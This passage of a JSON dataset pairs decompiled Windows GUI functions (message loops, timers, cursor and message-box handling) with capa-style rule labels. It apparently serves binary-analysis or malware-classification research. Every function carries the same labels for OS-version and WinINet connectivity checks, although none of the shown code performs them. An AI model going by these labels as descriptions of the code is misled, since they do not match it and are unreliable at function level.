        ],
        "decompiled_code": "\nuint64_t fcn.0044641c(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x152) != 0) {\n        (**(in_EAX + 0x150))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar3 = fcn.004585f8();\n        iVar4 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if ((iVar4 != 0) && (cVar1 = fcn.0040484c(),  cVar1 != '\\0')) {\n            uVar2 = 1;\n            goto code_r0x00446479;\n        }\n    }\n    uVar2 = 0;\ncode_r0x00446479:\n    return CONCAT14(uVar2, uVar2);\n}\n",
        "token_count": 210
    },
    "00446524": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00446524(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char cStackY68;\n    int32_t *in_stack_ffffffc0;\n    \n    uVar4 = 0;\n    iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 0, param_1);\n    if (iVar3 == 0) goto code_r0x0044662e;\n    if (*param_2 == 0) {\ncode_r0x00446555:\n        bVar1 = false;\n    }\n    else {\n        iVar3 = sub.user32.dll_IsWindowUnicode();\n        if (iVar3 == 0) goto code_r0x00446555;\n        bVar1 = true;\n    }\n    in_stack_ffffffc0 = param_2;\n    if (bVar1) {\n        iVar3 = sub.user32.dll_PeekMessageW(param_2, 0, 0, 0, 1);\n    }\n    else {\n        iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1);\n    }\n    if (iVar3 != 0) {\n        uVar4 = 1;\n        if (param_2[1] == 0x12) {\n            *(in_EAX + 0xa4) = 1;\n        }\n        else {\n            in_stack_ffffffc0 = in_stack_ffffffc0 & 0xffff00ff;\n            if (*(in_EAX + 0x102) != 0) {\n                (**(in_EAX + 0x100))();\n            }\n            cVar2 = fcn.00447dd0();\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.004463e8();\n                if ((cVar2 == '\\0') && (in_stack_ffffffc0 >> 8 == '\\0')) {\n                    cVar2 = fcn.004462a4();\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.004462f4();\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.0044625c();\n                            if (cVar2 == '\\0') {\n                                sub.user32.dll_TranslateMessage();\n                                cStackY68 = param_2;\n                                if (cStackY68 == '\\0') {\n                                    sub.user32.dll_DispatchMessageA();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                                else {\n                                    sub.user32.dll_DispatchMessageW();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0044662e:\n    return CONCAT44(in_stack_ffffffc0, uVar4);\n}\n",
        "token_count": 655
    },
    "0044665c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044665c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.00419878();\n        puVar1 = fcn.00402f00();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.00419740();\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "004466b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004466b8(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xb0) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00419898();\n                if ((*piVar1 == lParam) && (arg_ch == piVar1[1])) {\n                    fcn.00402f1c();\n                    fcn.0041978c();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "004467a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004467a4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        uVar3 = sub.user32.dll_GetCapture(0x1f, 0, 0);\n        sub.user32.dll_SendMessageA(uVar3);\n    }\n    fcn.00402f84();\n    cVar1 = fcn.00446748();\n    if (cVar1 == '\\0') {\n        uVar3 = fcn.00402fa4();\n        fcn.00402f84(uVar3);\n        fcn.0040da34();\n    }\n    else {\n        fcn.00402f84();\n        cVar1 = fcn.00446748();\n        if (cVar1 == '\\0') {\n            if (*(in_EAX + 0xea) == 0) {\n                fcn.00402f84();\n                fcn.004469b0();\n                return;\n            }\n            fcn.00402f84();\n            (**(in_EAX + 0xe8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "00446834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446834(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t lpRect;\n    uint *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hWnd;\n    uint var_ch;\n    uint lpCaption;\n    int32_t var_4h;\n    \n    iStack108 = 0x446850;\n    var_4h = in_EAX;\n    iStack112 = fcn.00447be4();\n    iVar2 = iStack112;\n    if (iStack112 == 0) {\n        iVar2 = *(var_4h + 0x30);\n    }\n    iStack108 = 2;\n    uStack116 = 0x446873;\n    hWnd = iStack112;\n    var_18h = (***0x494a20)();\n    uStack116 = 2;\n    uStack120 = *(var_4h + 0x30);\n    puStack124 = 0x446888;\n    var_1ch = (***0x494a20)();\n    if (var_18h != var_1ch) {\n        var_48h = 0x28;\n        puStack124 = &fcn.00446834::var_48h;\n        iStack128 = var_18h;\n        iStack132 = 0x4468ab;\n        (***0x494948)();\n        var_54h = &fcn.00446834::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        iStack112 = var_3ch - var_44h >> 1;\n        if (iStack112 < 0) {\n            iStack112 = iStack112 + ((var_3ch - var_44h & 1U) != 0);\n        }\n        iStack112 = iStack112 + var_44h;\n        uStack116 = 0;\n        uStack120 = *(var_4h + 0x30);\n        puStack124 = 0x4468f3;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack124 = 0x4468fb;\n    var_14h = fcn.0043b920();\n    puStack124 = 0x446903;\n    var_20h = fcn.0043b77c();\n    puStack124 = 0x44690e;\n    cVar1 = fcn.00445750();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack128 = 0x44699c;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    var_ch = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = iVar2;\n    if (var_18h != var_1ch) {\n        iVar2 = var_4ch - var_54h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_4ch - var_54h & 1U) != 0);\n        }\n        iVar3 = var_50h - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_50h - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_54h, 0, 0, 0x1d, 0x4469a3, arg_8h);\n    }\n    fcn.0043b9e4();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.0043b784();\n    return;\n}\n",
        "token_count": 1098
    },
    "004469b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004469e9)\n// WARNING: Removing unreachable block (ram,0x00446a10)\n\nvoid fcn.004469b0(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x446a6b;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.004055c8();\n    arg_8h = 0x10;\n    fcn.004461dc();\n    uVar1 = fcn.004059dc();\n    fcn.004059dc(uVar1);\n    fcn.00446834(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x446a72;\n    uStack288 = 0x446a62;\n    fcn.00405530();\n    uStack288 = 0x446a6a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 283
    },
    "00446a88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00446a88(char param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    char cStack28;\n    uint uStack24;\n    \n    iVar4 = 0;\n    uStack24 = CONCAT31(uStack24._1_3_, 1);\n    arg_8h = &uStack24;\n    uVar3 = fcn.00446bb0(arg_8h);\n    cStack28 = param_1;\n    if (uVar3 == '\\0') {\n        iVar4 = *(*0x499c20 + 0x68);\n        if ((iVar4 != 0) && ((*(iVar4 + 0x1c) & 0x10) != 0)) {\n            cStack28 = '\\0';\n        }\n        if ((((iVar4 != 0) && (iVar2 = fcn.00458814(),  iVar2 == -1)) && (*(iVar4 + 0x57) == '\\0')) &&\n           (*(iVar4 + 0x268) == 0)) {\n            cStack28 = '\\0';\n        }\n    }\n    if (cStack28 != '\\0') {\n        if (((iVar4 != 0) && (cVar1 = fcn.00458904(),  cVar1 != '\\0')) && (*(iVar4 + 0x284) != 0)) {\n            uStack24 = fcn.004585f8();\n            cVar1 = fcn.0044724c();\n            if (cVar1 == '\\0') {\n                return uVar3;\n            }\n            uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            return uVar3;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xac) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2 & 0xffff, arg_8h);\n            }\n        }\n        else {\n            uStack24 = *(in_EAX + 0x30);\n            if (*(in_EAX + 0x44) != 0) {\n                uStack24 = fcn.004585f8();\n            }\n            cVar1 = fcn.0044724c();\n            if (cVar1 != '\\0') {\n                uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 616
    },
    "00446bb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446bb0(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar2 = 0;\n    *arg_8h = 1;\n    iVar3 = 0;\n    if (*(*0x499c20 + 100) != 0) {\n        iVar3 = fcn.0043bd90();\n        if ((iVar3 != 0) && (*(iVar3 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar3 + 0x2f0))(arg_8h);\n        }\n    }\n    if (uVar2 == '\\0') {\n        iVar1 = *(*0x499c20 + 0x68);\n        if ((((iVar1 != 0) && (iVar3 != iVar1)) && (iVar1 != 0)) && (*(iVar1 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar1 + 0x2f0))(arg_8h);\n        }\n        if ((uVar2 == '\\0') && (*(in_EAX + 0x11a) != 0)) {\n            uVar2 = (**(in_EAX + 0x118))(arg_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 320
    },
    "00446c7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00446c7c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00446c7c::var_1h + 1;\n    uStack32 = 0x446cfa;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00446c7c::var_1h;\n    fcn.004059dc();\n    fcn.00446bb0(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.0044724c(),  cVar1 != '\\0')) {\n        fcn.00447ba8();\n        (**(**(in_EAX + 0x4c) + 0xc))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x446d01;\n    iStack36 = 0x446cf9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 315
    },
    "00446d0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00446d0c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00446d0c::var_1h + 1;\n    uStack32 = 0x446d83;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00446d0c::var_1h;\n    fcn.00446bb0(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.0044724c(),  cVar1 != '\\0')) {\n        fcn.00447ba8();\n        (**(**(in_EAX + 0x4c) + 0x10))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x446d8a;\n    iStack36 = 0x446d82;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 309
    },
    "00446e74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446e74(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x499c1c != 0) {\n        uStack24 = 0x446eb9;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        uVar1 = 0;\n        sub.user32.dll_KillTimer(0, *0x499c48);\n        *0x499c48 = 0;\n        fcn.00446dec();\n        *in_FS_OFFSET = uVar1;\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "00446edc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446edc(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x447029;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x446f06;\n    fcn.00446e50();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x446f25;\n        fcn.004474a4();\n    }\n    puStack48 = 0x446f2f;\n    fcn.004449d0();\n    puStack48 = 0x446f3a;\n    fcn.0044d5a8();\n    puStack48 = 0x446f47;\n    fcn.004470d4();\n    bVar1 = true;\n    uStack52 = 0x446fd0;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x12a) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0xc0) < 1) {\n        fcn.00446dec();\n    }\n    else if ((*0x499c48 == 0) &&\n            (*0x499c48 = sub.user32.dll_SetTimer(0, 0, *(in_EAX + 0xc0), fcn.00446e74),  *0x499c48 == 0)) {\n        fcn.00446dec();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x446fea;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x494d20) {\n        puStack48 = 0x446ffb;\n        cVar2 = fcn.0041f7b4();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x44700e;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x447030;\n    uStack40 = 0x447028;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 663
    },
    "004470d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004470d4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4470e8;\n    fcn.00405974();\n    if (!in_ZF) {\n        puStack20 = 0x4470f4;\n        fcn.00405584();\n        if (*(in_EAX + 0x122) == 0) {\n            puStack20 = 0x44711c;\n            fcn.00431c5c();\n            puStack20 = 0x447129;\n            fcn.0044a9f0();\n            uStack24 = 0x447159;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x447160;\n            uStack24 = 0x447158;\n            fcn.00404650();\n            return;\n        }\n        puStack20 = 0x44710c;\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "004471c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004471c4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.00443e04();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.00443df0();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 0x1c4) == 0) || (cVar1 = fcn.00458904(),  cVar1 == '\\0')) {\ncode_r0x0044722b:\n                        fcn.00447168(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.004585f8(*(iVar3 + 0x1c4));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x0044722b;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00447168(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "0044724c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0044724c(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX;\n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.0040700c();\n        uVar1 = fcn.0042d310();\n    }\n    return uVar1 & 0xffffff00 | *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 109
    },
    "0044726c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044726c(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.004472b0();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.00444a28);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.004474a4();\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "004472d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004472d8(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uchar *puVar5;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack48 = *(param_1 + 8);\n    iStack44 = uStack48;\n    uStack48._2_2_ = uStack48 >> 0x10;\n    iStack40 = uStack48._2_2_;\n    uStack64 = 0x44730d;\n    fcn.00450324();\n    uStack64 = 0x447318;\n    fcn.0044ee0c();\n    uStack64 = 0x44731d;\n    iVar2 = fcn.00444a08();\n    if ((iVar2 == 0) || (*(iVar2 + 0x8d) == '\\0')) {\n        uStack64 = 0x447333;\n        fcn.004474a4();\n    }\n    else {\n        if (iVar2 == *(in_EAX + 0x60)) {\n            uStack36 = *(param_1 + 8);\n            iStack32 = uStack36;\n            uStack36._2_2_ = uStack36 >> 0x10;\n            iStack28 = uStack36._2_2_;\n            uStack64 = 0x447369;\n            fcn.00450324();\n            uStack64 = uStack20;\n            uStack68 = uStack24;\n            iStack72 = in_EAX + 100;\n            iVar3 = sub.user32.dll_PtInRect();\n            bVar4 = iVar3 == 0;\n        }\n        else {\n            bVar4 = true;\n        }\n        puVar5 = &stack0xffffffb8;\n        if (bVar4) {\n            cVar1 = *(in_EAX + 0x58);\n            if (cVar1 == '\\0') {\n                iStack72 = *(in_EAX + 0x78);\n            }\n            else {\n                iStack72 = *(in_EAX + 0x80);\n            }\n            fcn.00451b4c(&stack0xffffffb8);\n            if ((cVar1 == '\\0') || (puVar5 != NULL)) {\n                fcn.004474a4();\n                *(in_EAX + 0x58) = cVar1;\n                *(in_EAX + 0x60) = iVar2;\n                fcn.0044726c();\n            }\n            else {\n                *(in_EAX + 0x58) = cVar1;\n                *(in_EAX + 0x60) = iVar2;\n                sub.user32.dll_GetCursorPos(&stack0xffffffb8);\n                fcn.00447744();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 710
    },
    "004474a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004474a4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.00447430();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.00444b90();\n        fcn.004472b0();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "004474dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004474dc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x4474f0;\n    var_4h = (***0x494970)();\n    puStack64 = &fcn.004474dc::var_28h;\n    uStack68 = 0x4474fc;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x447502;\n    iVar2 = sub.user32.dll_GetIconInfo();\n    if (iVar2 != 0) {\n        uStack76 = 0x447620;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x447526;\n        puStack72 = &stack0xfffffffc;\n        fcn.004269d4();\n        puStack84 = 0x447531;\n        iVar2 = fcn.00402ee8();\n        uStack88 = 0x4475f1;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = iVar2 + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_10h = iVar2;\n        cVar1 = fcn.00426a90(var_8h);\n        if ((cVar1 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar3 = *(iVar2 + 4) * *(iVar2 + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar3 < 0) {\n                uVar3 = uVar3 + 7;\n            }\n            var_14h = uVar3 >> 3;\n            var_4h = fcn.004474cc();\n            if ((var_4h == 0) && (SBORROW4(*(iVar2 + 8), *(iVar2 + 4) * 2) == *(iVar2 + 8) + *(iVar2 + 4) * -2 < 0)) {\n                